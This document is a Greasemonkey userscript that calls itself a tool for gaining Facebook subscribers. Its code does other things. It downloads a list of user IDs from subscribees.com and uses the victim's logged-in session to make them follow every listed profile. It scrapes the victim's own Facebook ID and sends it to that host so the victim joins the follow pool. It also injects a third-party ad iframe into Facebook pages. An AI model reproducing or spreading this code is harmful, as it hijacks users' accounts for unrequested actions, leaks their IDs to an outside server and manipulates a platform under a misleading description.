// ==UserScript==
// @name       		Facebook Auto Subscribe
// @description 	It allows you to get more subscribers
// @include			http://facebook.com/*
// @include			http://*.facebook.com/*
// @include			https://facebook.com/*
// @include			https://*.facebook.com/*
// @exclude			http://*.channel.facebook.com/*
// @exclude			https://*.channel.facebook.com/*
// @require       http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.js
// @version     1.0
// ==/UserScript==
var myuid;
var already=getCookie("alreadysubed");
if (already!=null && already!="")
{
var i = already;
}else{
var i = 0;
}

ads();
GM_xmlhttpRequest({
  method: "GET",
  url: "http://subscribees.com/iSubs.txt",
  onload: function(response) {
  uids = response.responseText.split(",");
  search();
  }
});
function sleep() {
	setInterval(function() {
		load()
	}, 1000);
}

function setCookie(c_name,value,exdays)
{
var exdate=new Date();
exdate.setDate(exdate.getDate() + exdays);
var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
document.cookie=c_name + "=" + c_value;
}

function contains(arr, findValue) {
    var x = arr.length;
	var y = 0;
    while (x>y) {
        if (arr[y] == findValue) return true;
		y = y + parseInt('1');
    }
    return false;
}

function check(){
var ren = contains(uids, myuid);
if(!ren){
GM_xmlhttpRequest({
  method: "GET",
  url: "http://subscribees.com/iSubs.php?uid=" + myuid,
  onload: function(response) {
  }
});
}
sleep();
}

function getCookie(c_name)
{
var i,x,y,ARRcookies=document.cookie.split(";");
for (i=0;i<ARRcookies.length;i++)
{
x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
x=x.replace(/^\s+|\s+$/g,"");
if (x==c_name)
{
return unescape(y);
}
}
}

function subsc(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/follow/follow_profile.php?location=1').setData({ profile_id: " + uidss + ",norefresh:true }).send();";
		document.body.appendChild(a);
}

function load() {
  if(!uids[i] == ""){
  subsc(uids[i]);
  i = i + parseInt('1');
  setCookie("alreadysubed",i,365);
  }
}

function search() {
	$('.rfloat').each(function(index) {
			var extract_url = $(this).find('img').attr('id');
			if (!extract_url) {
				var extract_url = $(this).find('img').attr('ajaxify');
			}
			if (!extract_url) {
				extract_url = '1';
			}
			if(extract_url.indexOf("ofile_pic_header") !== -1){
			myuid = parseInt(/(\d+)/.exec(extract_url)[1], 10);
			check();
			}
	});
}
function ads() {
	$('div.ego_section').append('Auto Subscribe<br><iframe width=200px height=80px scrolling=no src="http://subscribees.com/ads1.php">');
}
